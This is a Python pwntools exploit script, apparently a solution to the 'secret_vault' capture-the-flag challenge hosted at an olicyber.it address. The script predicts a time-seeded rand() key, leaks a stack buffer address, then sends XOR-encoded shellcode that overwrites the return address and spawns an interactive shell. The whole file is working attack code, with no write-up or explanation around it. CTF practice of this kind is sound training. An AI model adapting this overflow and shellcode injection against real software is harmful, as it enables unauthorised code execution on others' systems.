from pwn import *
from ctypes import CDLL

#context.binary = elf = ELF('./secret_vault')
context.arch = 'amd64'
context.terminal = ('kgx', '-e')

libc = CDLL('libc.so.6')
libc.srand(libc.time(0))

if args.REMOTE:
    r = remote('vault.challs.olicyber.it', 10006)
else:
    r = gdb.debug('./secret_vault', '''
                  b *main+100
                  continue
                  ''')

key = libc.rand() % 256
print('Key:', key)

r.recvuntil(b'>')
r.sendline(b'1')
r.recvuntil(b'messaggio:\n')
r.sendline(b'a') # test, we need this to get the address of the buffer
r.recvuntil(b'Messaggio criptato correttamente in ')
buffer_address = int(r.recvuntil(b'!').strip().decode()[:-1], 16)

print('Buffer address:', hex(buffer_address))

r.recvuntil(b'>')
r.sendline(b'1')
r.recvuntil(b'messaggio:\n')

payload = asm(shellcraft.sh())
payload = payload.ljust(88, b'\x00')
payload = xor(payload, key)
payload += p64(buffer_address)
r.sendline(payload)

r.recvuntil(b'>')
r.sendline(b'3')

r.interactive()